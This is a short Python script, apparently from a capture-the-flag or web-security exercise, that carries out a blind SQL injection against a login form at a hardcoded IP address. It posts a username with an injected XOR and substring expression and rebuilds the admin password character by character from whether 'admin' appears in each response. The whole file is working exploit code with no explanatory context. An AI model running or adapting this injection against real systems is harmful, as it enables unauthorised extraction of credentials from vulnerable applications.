#!/usr/bin/python
# coding:utf-8 

import requests 
import string

s = string.ascii_letters + string.digits
url = "http://39.108.154.135:8000?action=show"

def getPassword():
    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
    passwd = ""
    for p in range(1,34):
        print(passwd)

        for i in s:
            passwdTmp = i + passwd
            data = {"username": username.format(pos=str(p), passwd=passwdTmp)}
            
            # print data
            res = requests.post(url ,data)
            if "admin" in res.text:
                passwd = passwdTmp
                break


if __name__ == "__main__":
    getPassword()